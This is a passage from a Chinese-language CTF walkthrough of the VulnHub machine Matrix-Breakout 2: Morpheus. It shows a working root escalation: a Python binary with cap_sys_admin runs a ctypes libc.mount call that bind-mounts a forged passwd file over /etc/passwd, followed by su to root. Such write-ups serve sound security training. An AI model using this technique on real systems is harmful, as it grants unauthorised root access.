$1$he0w6jPT$Q02kWtHF7qEchSicLlamk1
cypher@morpheus:~$ vim ./passwd
cypher@morpheus:~$ cat ./passwd | grep 'root'
root:$1$he0w6jPT$Q02kWtHF7qEchSicLlamk1:0:0:root:/root:/bin/bash
cypher@morpheus:~$ cat /etc/passwd | grep 'root'
root:x:0:0:root:/root:/bin/bash
cypher@morpheus:~$ /usr/sbin/getcap -r / 2>/dev/null
/usr/bin/python3-9 cap_sys_admin=ep
/usr/bin/ping cap_net_raw=ep
/usr/sbin/xtables-legacy-multi cap_net_admin=ep
/usr/sbin/xtables-nft-multi cap_net_admin=ep
```

然后使用python替换文件：

```bash
cypher@morpheus:~$ /usr/bin/python3-9
Python 3.9.2 (default, Feb 28 2021, 17:03:44) 
[GCC 10.2.1 20210110] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> from ctypes import *
>>> libc = CDLL("libc.so.6")
>>> libc.mount.argtypes = (c_char_p, c_char_p, c_char_p, c_ulong, c_char_p)
>>> MS_BIND = 4096
>>> source = b"/home/cypher/passwd"
>>> target = b"/etc/passwd"
>>> filesystemtype = b"none"
>>> options = b"rw"
>>> mountflags = MS_BIND
>>> libc.mount(source, target, filesystemtype, mountflags, options)
0
>>> exit()
cypher@morpheus:~$ su -
Password: 
root@morpheus:~# 
```

拿下root！！！！！

```bash
root@morpheus:~# ls -la
total 48
drwx------  4 root root  4096 Nov 29  2021 .
drwxr-xr-x 19 root root  4096 Oct 28  2021 ..
-rw-r--r--  1 root root   571 Apr 10  2021 .bashrc
-rw-------  1 root root    79 Oct 28  2021 .lesshst
drwxr-xr-x  3 root root  4096 Oct 28  2021 .local
-rw-r--r--  1 root root   161 Jul  9  2019 .profile
-rw-r--r--  1 root root    66 Oct 28  2021 .selected_editor
drwxr-xr-x  2 root root  4096 Oct 28  2021 .vim
-rw-------  1 root root 10925 Oct 28  2021 .viminfo
-rw-------  1 root root    54 Oct 28  2021 FLAG.txt
root@morpheus:~# cat FLAG.txt 
You've won!

Let's hope Matrix: Resurrections rocks!
```

## 参考

https://github.com/devl00p/blog/blob/c3505ecafc530b2d105564af12444878ff5a14e1/ctf_writeups/Solution%20du%20CTF%20Matrix-Breakout%3A%202%20Morpheus%20de%20VulnHub.md?plain=1

https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities#cap_sys_admin

https://devl00p.github.io/posts/Solution-du-CTF-Matrix-Breakout-2-Morpheus-de-VulnHub/

https://www.bilibili.com/video/BV18i421Y7La/?spm_id_from=333.999.0.0&vd_source=8981ead94b755f367ac539f6ccd37f77